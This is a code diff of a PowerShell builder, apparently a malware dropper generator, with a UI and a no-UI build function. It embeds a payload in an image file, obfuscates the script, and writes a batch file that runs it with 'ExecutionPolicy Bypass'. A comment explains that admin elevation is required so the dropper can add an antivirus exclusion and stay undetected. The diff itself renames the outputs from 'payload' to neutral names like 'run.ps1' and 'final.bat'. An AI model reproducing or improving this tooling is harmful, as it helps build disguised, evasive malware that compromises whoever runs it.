@@ -323,7 +323,7 @@ function build {
     [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
     $var_OUTPUT_BOX.Text += "Writing payload to file...`n"
     $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
-    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
+    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\run.ps1"
 
     if ($type -eq "bat") {
         $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
@@ -332,7 +332,7 @@ function build {
         switch ($obfuscate_box) {
             "Yes" {
                 $var_OUTPUT_BOX.Text += "Obfuscating powershell code...`n"
-                Invoke-PowershellOBF "$working_dir\output\payload.ps1"
+                Invoke-PowershellOBF "$working_dir\output\run.ps1"
             }
             "No" {
                 $var_OUTPUT_BOX.Text += "No Obfuscation...`n"
@@ -351,20 +351,20 @@ function build {
             }
             $line_split = $line.Replace("`n", "")
             $line_split = $line_split.Replace("`r", "")
-            $line = "echo " + $line_split + " >> payload.ps1"
+            $line = "echo " + $line_split + " >> run.ps1"
             $line = Invoke-obfuscate $line
-            Add-Content -Path .\output\payload.bat -Value $line
+            Add-Content -Path .\output\final.bat -Value $line
         }
-        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1"
+        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\run.ps1"
         $str_obf = Invoke-obfuscate $str_obf
         $var_OUTPUT_BOX.Text += "Writing obfuscated batch code to file...`n"
-        Add-Content -Path .\output\payload.bat -Value $str_obf
-        $var_OUTPUT_BOX.Text += "Payload.bat created in $working_dir\output `n"
+        Add-Content -Path .\output\final.bat -Value $str_obf
+        $var_OUTPUT_BOX.Text += "final.bat created in $working_dir\output `n"
         $var_OUTPUT_BOX.Text += "Cleaning up...`n"
-        Remove-Item -Path .\output\payload.ps1 -Force
+        Remove-Item -Path .\output\run.ps1 -Force
     }
     else {
-        $var_OUTPUT_BOX.Text += "Payload.ps1 created in $working_dir\output `n"
+        $var_OUTPUT_BOX.Text += "run.ps1 created in $working_dir\output `n"
     }
     #set color to green in text box
     $var_OUTPUT_BOX.Text += "`nDone!`n"
@@ -452,7 +452,7 @@ function Invoke-UI {
     })
 
     $var_OUTPUT_BOX.Text += "Successfully Started`n"
-    Remove-Item -Path .\output\payload.ps1 -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path .\output\run.ps1 -Force -ErrorAction SilentlyContinue
     Hide-Console #Makes it look nice
     #If you don't want UAC admin to be required when running the payload set this to $false
     $uac_required = $true #This makes it so when they run the bat or ps1 file it requires them to run as admin. This is important because runtime the dropper sometimes won't be fud but this will add it as a exclusion.
@@ -497,7 +497,7 @@ function Invoke-BuildNoUI {
     [System.IO.File]::WriteAllBytes("$working_dir\output\$image_name", $combined_bytes)
     Write-Host "Writing payload to file..."
     $EMBEDDED_CODE = $EMBEDDED_CODE.Replace("test_image.jpg", $image_name)
-    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\payload.ps1"
+    $EMBEDDED_CODE | Out-File -Encoding ASCII "$working_dir\output\run.ps1"
 
     if ($type -eq "bat") {
         Write-Host "No Obfuscation..."
@@ -506,7 +506,7 @@ function Invoke-BuildNoUI {
             Write-Host "No Obfuscation..."
         } else {
             Write-Host "Obfuscating..."
-            Invoke-obfuscate -inputFile "$working_dir\output\payload.ps1" -outputFile "$working_dir\output\payload.ps1"
+            Invoke-obfuscate -inputFile "$working_dir\output\run.ps1" -outputFile "$working_dir\output\run.ps1"
         }
     }
 
@@ -521,20 +521,20 @@ function Invoke-BuildNoUI {
             }
             $line_split = $line.Replace("", "")
             $line_split = $line_split.Replace("`r", "")
-            $line = "echo " + $line_split + " >> payload.ps1"
+            $line = "echo " + $line_split + " >> run.ps1"
             $line = Invoke-obfuscate $line
-            Add-Content -Path .\output\payload.bat -Value $line
+            Add-Content -Path .\output\final.bat -Value $line
         }
-        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\payload.ps1"
+        $str_obf = "powershell.exe -ExecutionPolicy Bypass -File .\run.ps1"
         $str_obf = Invoke-obfuscate $str_obf
         Write-Host "Writing obfuscated batch code to file..."
-        Add-Content -Path .\output\payload.bat -Value $str_obf
-        Write-Host "Payload.bat created in $working_dir\output "
+        Add-Content -Path .\output\final.bat -Value $str_obf
+        Write-Host "final.bat created in $working_dir\output "
         Write-Host "Cleaning up..."
-        Remove-Item -Path .\output\payload.ps1 -Force
+        Remove-Item -Path .\output\run.ps1 -Force
     }
     else {
-        Write-Host "Payload.ps1 created in $working_dir\output "
+        Write-Host "run.ps1 created in $working_dir\output "
     }
     #set color to green in text box
     Write-Host "Done!"
